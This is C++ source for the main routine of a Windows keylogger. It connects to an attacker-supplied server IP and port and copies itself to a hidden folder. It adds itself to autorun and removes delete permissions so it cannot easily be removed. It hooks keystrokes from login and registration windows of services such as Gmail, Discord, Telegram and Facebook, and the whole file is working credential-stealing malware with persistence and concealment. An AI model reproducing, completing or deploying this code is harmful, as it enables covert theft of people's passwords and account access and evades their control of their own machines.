#include <Windows.h>
#include <tchar.h>
#include <string>
#include "Keylogger.h"
#include <iostream>
#include "Concealment.h"

#ifndef UNICODE
#define UNICODE
#endif // !UNICODE

std::vector<std::wstring> filters = { L"Discord", L"VK", L"Google", L"Yandex", L"Youtube", L"Gmail",
									  L"Telegram", L"Facebook", L"Viber", L"Authorization", L"Регистрация", L"Вход", L"Login", L"log in", L"sign up" };

HANDLE mutex = NULL;

bool TryStartLogger()
{
	mutex = CreateMutexW(NULL, FALSE, L"keylogger");
	if (mutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS)
		return false;
	return true;
}

int wmain(int argc, wchar_t* argv[])
{
	bool flag = TryStartLogger();
	if (argc < 4)
		std::cout << "[ERROR]Pass server ip, port and buffer size as console parameters.\n";
	if (argc < 4 || !flag)
		return 0;

	int buffSize = std::stoi(argv[3]);
	TcpClient *client = new TcpClient(argv[1], argv[2], buffSize);
	while (!client->Connect)
		Sleep(1000);

	flag = false;
	if (argv[0] != L"C:\\Keylogger\\KeyLogger.exe")
		flag = Concealment::Replicate(argv[0], L"C:\\Keylogger\\KeyLogger.exe");
	else flag = true;
	if (flag)
	{
		std::vector<std::wstring> args = { argv[1], argv[2], argv[3] };
		Concealment::AddToAutorun(L"C:\\Keylogger\\KeyLogger.exe", L"Keylogger", args);
		Concealment::HideFolder(L"C:\\Keylogger");
		Concealment::RemoveDeletePermission(L"C:\\Keylogger");
	}

	Filters *appFilters = new Filters(filters);
	Keylogger *keylogger = new Keylogger(client, appFilters);
	if (keylogger->SetHook())
		keylogger->~Keylogger();

	delete(keylogger);
	ReleaseMutex(mutex);
	return 0;
}